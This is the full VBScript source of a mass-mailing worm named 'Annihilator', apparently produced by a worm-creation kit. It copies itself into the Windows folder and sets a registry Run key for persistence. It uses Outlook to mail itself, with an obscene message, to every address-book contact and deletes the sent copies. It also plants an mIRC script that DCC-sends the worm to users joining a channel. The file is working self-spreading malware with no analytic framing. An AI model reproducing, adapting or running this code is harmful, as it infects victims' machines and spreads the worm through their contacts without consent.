'Worm Created whit [K]Alamar's Vbs Worms Creator 0.1
On Error Resume Next
Set zjqjdqbbpgo = CreateObject("WScript.Shell")
set lyfculmwknt=createobject("scripting.filesystemobject")
lyfculmwknt.copyfile wscript.scriptfullname,lyfculmwknt.GetSpecialFolder(0)& "\Annihilator.vbs"
zjqjdqbbpgo.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\SysBoot","wscript.exe "&lyfculmwknt.GetSpecialFolder(0)& "\Annihilator.vbs %"
if zjqjdqbbpgo.regread ("HKCU\software\Annihilator\mailed") <> "1" then
hjwjpmvufqc()
end if
if zjqjdqbbpgo.regread ("HKCU\software\Annihilator\mirqued") <> "1" then
ywclsdxbnlz()
end if
Function hjwjpmvufqc()
On Error Resume Next
Set arbdhcswxwy = CreateObject("Outlook.Application")
If arbdhcswxwy= "Outlook"Then
Set knrgnmuwyhu=arbdhcswxwy.GetNameSpace("MAPI")
For Each byqhisgjqof In knrgnmuwyhu.AddressLists
If byqhisgjqof.AddressEntries.Count <> 0 Then
For mzzmrxlvkwf= 1 To byqhisgjqof.AddressEntries.Count
Set sglirjumrus = byqhisgjqof.AddressEntries(mzzmrxlvkwf)
Set yhostxjhvwn = arbdhcswxwy.CreateItem(0)
yhostxjhvwn.To = sglirjumrus.Address
yhostxjhvwn.Subject = "Here you have, ;o)"
yhostxjhvwn.Body = "Hi your gooddamn mutherfucker!" & vbcrlf & "" & vbcrlf & "Check This and suck my dick!" & vbcrlf & ""
yhostxjhvwn.Attachments.Add lyfculmwknt.GetSpecialFolder(0)& "\Annihilator.vbs"
yhostxjhvwn.DeleteAfterSubmit = True
If yhostxjhvwn.To <> "" Then
yhostxjhvwn.Send
End If
Next
End If
Next
zjqjdqbbpgo.regwrite "HKCU\software\Annihilator\mailed", "1"
end if
End Function
Function ywclsdxbnlz
On Error Resume Next
if lyfculmwknt.fileexists("c:\mirc\mirc.ini") then MircLoc="c:\mirc"
if lyfculmwknt.fileexists("c:\mirc32\mirc.ini") then MircLoc="c:\mirc"
Programfilesdir=zjqjdqbbpgo.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
if lyfculmwknt.fileexists(Programfilesdir & "\mirc.ini") then MircLoc=Programfilesdir & "\mirc"
set qzdyommlogk = lyfculmwknt.CreateTextFile(MircLoc & "\script.ini", True)
qzdyommlogk.writeline "n0=on 1:JOIN:#:{"
qzdyommlogk.writeline "n1=  /if ( $nick == $me ) { halt }"
qzdyommlogk.writeline "n2=  /.dcc send $nick C:\WIN95\Annihilator.vbs"
qzdyommlogk.writeline "n3=}"
qzdyommlogk.close
zjqjdqbbpgo.regwrite "HKCU\software\Annihilator\Mirqued", "1"
end function
